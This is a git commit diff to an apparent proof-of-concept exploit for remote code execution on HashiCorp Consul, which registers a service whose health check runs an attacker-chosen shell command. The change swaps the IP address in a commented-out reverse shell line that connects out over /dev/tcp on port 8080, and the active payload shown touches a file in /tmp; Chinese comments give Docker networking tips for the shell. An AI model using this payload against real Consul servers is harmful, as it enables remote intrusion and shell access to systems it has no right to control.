fbaf3754d249db727c9547e2578caf0a0f5ef414
s1mba <dameng34@163.com>
2020-02-18 21:12:03 +0800

    change consul poc

--- consul/consul_rce_poc.py
+++ consul/consul_rce_poc.py
@@ -6,7 +6,7 @@ data = {
           "Address": "127.0.0.1",
           "Port": 80,
           "check": {
-          #"script": "sh -i >& /dev/tcp/119.28.1.195/8080 0>&1", # bash may not exist
+          #"script": "sh -i >& /dev/tcp/119.1.1.28/8080 0>&1", # bash may not exist
           # 某些镜像 /dev/tcp 目录不存在会导致失败
           # docker 里面可以connect 外网/宿主机docker0，但不能写成127.0.0.1，那个是docker自己的lo
           "script":"touch /tmp/simba.txt",
